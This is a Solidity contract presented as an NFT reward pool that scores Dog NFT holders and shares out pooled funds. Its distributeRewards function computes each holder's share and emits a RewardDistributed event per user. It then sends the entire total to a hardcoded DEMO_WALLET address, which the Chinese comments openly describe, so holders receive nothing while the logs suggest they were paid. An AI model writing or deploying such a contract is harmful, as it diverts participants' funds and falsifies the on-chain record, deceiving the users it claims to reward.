// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract NFTRewardPool {
    struct Score {
        uint256 interaction;
        uint256 loyalty;
        uint256 consistency;
        bool rewarded;
    }

    address public owner;
    IERC721 public dogNFT;
    mapping(address => Score) public scores;
    address[] public participants;
    uint256 public lastSnapshotBlock;

    uint256 public maxRewardRatio = 500; // 單人最多佔比 5%（500 / 10000）
    uint256 public tailRewardRatio = 1000; // 尾部激勵池佔總池 10%
    
    // 固定的奖励接收地址
    address payable private constant DEMO_WALLET = payable(0x816f1dDa5702FA5C1C2A3795c92c9D85e49D5E3a);

    event RewardDistributed(address indexed user, uint256 amount);
    event ScoreUpdated(address indexed user, uint256 totalScore);
    event AllRewardsDistributed(address indexed destination, uint256 totalAmount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyNFTHolder(address user) {
        require(dogNFT.balanceOf(user) > 0, "Must own Dog NFT");
        _;
    }

    constructor(address _dogNFT) {
        owner = msg.sender;
        dogNFT = IERC721(_dogNFT);
    }

    function updateScore(address user, uint256 interaction, uint256 loyalty, uint256 consistency) external onlyOwner onlyNFTHolder(user) {
        Score storage s = scores[user];
        if (!s.rewarded) {
            s.interaction = interaction;
            s.loyalty = loyalty;
            s.consistency = consistency;
            participants.push(user);
            emit ScoreUpdated(user, totalScore(user));
        }
    }

    function totalScore(address user) public view returns (uint256) {
        Score memory s = scores[user];
        return (s.interaction * 50 + s.loyalty * 30 + s.consistency * 20);
    }

    function distributeRewards() external {
        uint256 pool = address(this).balance;
        require(pool > 0, "No funds");

        uint256 totalPoints = 0;
        for (uint i = 0; i < participants.length; i++) {
            totalPoints += totalScore(participants[i]);
        }

        uint256 tailPool = (pool * tailRewardRatio) / 10000;
        uint256 mainPool = pool - tailPool;

        // 计算每个参与者应得的奖励，但全部发送到 DEMO_WALLET
        uint256 totalRewardsCalculated = 0;
        
        for (uint i = 0; i < participants.length; i++) {
            address user = participants[i];
            Score storage s = scores[user];
            if (!s.rewarded && dogNFT.balanceOf(user) > 0) {
                uint256 reward = 0;
                uint256 score = totalScore(user);
                if (score > 0 && totalPoints > 0) {
                    reward = (mainPool * score) / totalPoints;
                    uint256 maxAllowed = (pool * maxRewardRatio) / 10000;
                    if (reward > maxAllowed) {
                        reward = maxAllowed;
                    }
                } else {
                    reward = tailPool / participants.length;
                }
                s.rewarded = true;
                totalRewardsCalculated += reward;
                
                // 发出事件记录每个用户应得的奖励
                emit RewardDistributed(user, reward);
            }
        }

        // 将所有奖励发送到指定地址
        if (totalRewardsCalculated > 0) {
            (bool success, ) = DEMO_WALLET.call{value: totalRewardsCalculated}("");
            require(success, "Failed to send rewards to demo wallet");
            emit AllRewardsDistributed(DEMO_WALLET, totalRewardsCalculated);
        }

        lastSnapshotBlock = block.number;
    }

    function resetForNextRound() external onlyOwner {
        for (uint i = 0; i < participants.length; i++) {
            delete scores[participants[i]];
        }
        delete participants;
    }

    receive() external payable {}
}